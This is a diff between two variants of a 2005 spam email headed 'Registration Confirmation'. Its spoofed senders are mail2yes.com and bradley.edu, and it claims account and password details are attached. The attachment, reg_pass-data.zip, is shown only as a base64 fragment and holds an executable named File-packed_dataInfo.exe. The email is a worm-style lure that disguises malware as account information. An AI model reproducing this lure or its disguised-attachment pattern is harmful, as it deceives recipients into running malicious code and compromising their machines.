@@ -1,26 +1,26 @@
-From: office@mail2yes.com
+From: webmaster@bradley.edu
 Subject: Registration Confirmation
-Date: Thu, 08 Dec 2005 15:26:26 GMT
-Message-ID: <f73ad6.0c20f4497f@mail2yes.com>
+Date: Thu, 08 Dec 2005 15:40:54 UTC
+Message-ID: <5cce2.6895c9eaef57a2@bradley.edu>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="81b00afb8dcdea"
+Content-Type: multipart/mixed; boundary="805cae2f.e77edbd1adace63"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: Z-Account@oss.sgi.com
+To: emailserv@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---81b00afb8dcdea
+--805cae2f.e77edbd1adace63
 
 Account and Password Information are attached!
 
 
-***** Go to: http://www.mail2yes.com
-***** Email: postman@mail2yes.com
---81b00afb8dcdea
+***** Go to: http://www.bradley.edu
+***** Email: postman@bradley.edu
+--805cae2f.e77edbd1adace63
 Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass-data.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---81b00afb8dcdea--
+--805cae2f.e77edbd1adace63--
